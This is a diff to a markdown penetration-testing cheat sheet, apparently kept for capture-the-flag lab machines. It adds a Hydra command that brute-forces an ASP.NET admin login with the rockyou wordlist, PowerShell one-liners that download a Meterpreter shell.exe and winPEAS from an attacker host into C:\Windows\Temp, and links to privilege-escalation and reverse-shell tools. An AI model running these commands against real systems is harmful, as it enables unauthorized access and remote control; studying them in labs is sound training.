@@ -35,6 +35,29 @@ https://github.com/OJ/gobuster
 ```
 gobuster dir -u [http://<ip>:<port> or domain] -w <word list location>
 ```
+/robots.txt
+recomendet list https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt
+
+## Hidra
+```
+hydra -l admin -P /usr/share/wordlists/rockyou.txt   10.10.118.158 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=0%2FMGgWbIzIRgqhDCtNxWFt4Tc9qyY5a9TZRKNvqhCwYMrXGMAYBZml7vdDtpwP0Gs8B%2BJALyjKTCEIMk6xYFrbTt622CVKylB7FK8oaJLlg%2B%2FOWgr9%2BL3PHbrUzQH8wLnV%2FN%2Bj3Rye5w9YS36Ier%2BWkL27YST5VvFpvoG1xcn5uuHXo85zrG7bjPB9L9QpmoOkalVM7PN3AlHN9ZF%2BQo6UuS8pNePHcNagYeWoQ47VqMO1yj8gKtcIj6mX0cXJ1U2FqAyInk%2BcMtIRceh69zAUdKnyp85tlaS9%2FFcmUXlN1922ZFAaCintSprVFHb6IXZOVLnvuTMhaCWBm6HtcIju7Vk4p1DHvB9pXEWZf5%2FawRBnRc&__EVENTVALIDATION=YRuRYPS0n%2FeTLUd5sdh31ZXHxhW6Xh%2BepJW9H2xkRVVZOZfo9IpP6Rui2nn%2ByuZpCCnOkSEhE%2Fd8%2FwZ4EZ6N7lOobh%2FU8pDcxVHXTdgKuELMtvwy6BGJkNTqV8dIK47bernMdrk22BfWb0DA1a%2Brp5NvMYgH8AG8NI2JL6x7YfE0Oj0o&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed" -vv
+```
+
+## Windows 
+- Dump the metarpreter hear
+  - C:\Windows\Temp
+```
+powershell -c "Invoke-WebRequest -Uri 'http://10.10.192.186:8080/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"
+
+shell
+powershell -c "Invoke-WebRequest -Uri 'http://10.10.192.186:8080/winPEAS.bat' -OutFile 'C:\Windows\Temp\winPEAS.bat'"
+exit
+```
+
+- https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+- https://github.com/samratashok/nishang
+  - https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+
 
 ## Unix Binaries (Used to bypass security restrictions)
 https://gtfobins.github.io/
